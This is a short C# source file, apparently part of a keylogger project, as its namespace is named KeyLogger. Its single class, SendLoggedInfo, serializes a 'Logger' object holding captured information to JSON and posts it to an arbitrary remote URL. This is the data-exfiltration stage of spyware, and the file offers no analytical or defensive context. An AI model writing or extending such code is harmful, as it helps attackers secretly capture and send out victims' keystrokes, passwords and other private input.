using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{

    public static class SendLoggedInfo
    {
        public static async Task<string> SendInfo(string url, Logger LoggedInfo)
        {
            HttpClient httpClient = new HttpClient();

            var json = JsonConvert.SerializeObject(LoggedInfo);

            var content = new StringContent(json, Encoding.UTF8, "application/json");

            var resp = await httpClient.PostAsync(url, content);
            var response = await resp.Content.ReadAsStringAsync();

            return response;
        }
    }

}
